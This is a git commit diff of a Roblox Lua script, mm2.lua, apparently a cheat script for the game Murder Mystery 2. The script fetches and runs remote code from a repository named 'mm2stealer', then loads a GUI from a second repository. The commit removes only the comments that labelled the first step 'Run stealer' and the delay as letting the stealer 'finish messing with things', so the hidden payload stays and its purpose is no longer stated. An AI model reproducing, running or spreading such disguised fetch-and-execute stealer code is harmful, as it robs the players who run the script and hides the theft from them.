32cf8cdd61c3781ff85acfad37f812dd41baf15e
ScriptsHub11 <martinnader717@gmail.com>
2025-07-21 23:44:02 +0300

    Update mm2.lua

--- mm2.lua
+++ mm2.lua
@@ -1,13 +1,10 @@
 loadstring([[
-    -- Run stealer
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsHub11/mm2stealer/refs/heads/main/mm2stealerr"))()
     end)
 
-    -- Delay to allow stealer to finish messing with things
     wait(2)
 
-    -- Run GUI
     pcall(function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring"))()
     end)
